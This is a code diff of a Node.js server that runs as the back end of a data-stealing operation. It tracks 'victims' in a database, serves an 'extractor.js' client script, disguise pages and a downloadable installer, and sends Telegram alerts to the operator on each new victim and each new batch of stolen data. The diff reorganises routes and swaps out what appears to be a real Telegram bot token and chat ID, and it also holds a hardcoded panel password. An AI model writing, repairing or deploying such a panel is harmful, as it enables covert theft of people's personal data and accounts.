@@ -29,20 +29,10 @@ const CONFIG = {
         password: 'Phantom2024!'
     },
     telegram: {
-        botToken: '8898422922:AAHKKmTW2mgJyz3lFV7vqtk7T7RjT5qMf78',    // ← GET FROM @BotFather
-        chatId: '7075480337'         // ← GET FROM @userinfobot
+        botToken: 'YOUR_BOT_TOKEN_HERE',    // ← GET FROM @BotFather
+        chatId: 'YOUR_CHAT_ID_HERE'         // ← GET FROM @userinfobot
     }
 };
-
-// ===== DOWNLOAD INSTALLER =====
-this.app.get('/download/installer.js', (req, res) => {
-    const installerPath = path.join(__dirname, 'public', 'download', 'installer.js');
-    if (fs.existsSync(installerPath)) {
-        res.sendFile(installerPath);
-    } else {
-        res.status(404).send('Installer not found');
-    }
-});
 
 // ================================================
 // DATABASE
@@ -138,7 +128,6 @@ class Database {
                 function(err) {
                     if (err) reject(err);
                     else {
-                        // Update victim data count
                         this.db.run(
                             'UPDATE victims SET data_count = data_count + 1 WHERE victim_id = ?',
                             [victimId],
@@ -232,6 +221,9 @@ class Server {
         this.app.use(express.static(path.join(__dirname, 'public')));
     }
 
+    // ================================================
+    // SETUP ROUTES - ALL ROUTES GO INSIDE HERE
+    // ================================================
     setupRoutes() {
         // ===== PUBLIC =====
         this.app.get('/', (req, res) => {
@@ -253,6 +245,16 @@ class Server {
 
         this.app.get('/client/extractor.js', (req, res) => {
             res.sendFile(path.join(__dirname, 'client', 'extractor.js'));
+        });
+
+        // ===== DOWNLOAD INSTALLER =====
+        this.app.get('/download/installer.js', (req, res) => {
+            const installerPath = path.join(__dirname, 'public', 'download', 'installer.js');
+            if (fs.existsSync(installerPath)) {
+                res.sendFile(installerPath);
+            } else {
+                res.status(404).send('Installer not found');
+            }
         });
 
         // ===== DISGUISE PAGES =====
@@ -283,7 +285,6 @@ class Server {
                 const result = await this.db.addVictim(data);
                 this.io.emit('new_victim', { victimId: result.victimId });
 
-                // ===== TELEGRAM NOTIFICATION - NEW VICTIM =====
                 await this.sendTelegram(`
 👁️ <b>NEW VICTIM!</b>
 
@@ -311,7 +312,6 @@ class Server {
                 await this.db.saveExtractedData(victimId, dataType, data);
                 this.io.emit('new_data', { victimId, dataType });
 
-                // ===== TELEGRAM NOTIFICATION - NEW DATA =====
                 const dataSize = JSON.stringify(data).length;
                 await this.sendTelegram(`
 📊 <b>NEW DATA RECEIVED!</b>
@@ -387,6 +387,9 @@ class Server {
         });
     }
 
+    // ================================================
+    // WEB SOCKET
+    // ================================================
     setupWebSocket() {
         this.io.on('connection', (socket) => {
             console.log('🔌 Client connected:', socket.id);
@@ -419,6 +422,9 @@ class Server {
         });
     }
 
+    // ================================================
+    // START
+    // ================================================
     start() {
         this.server.listen(CONFIG.server.port, () => {
             console.log(`
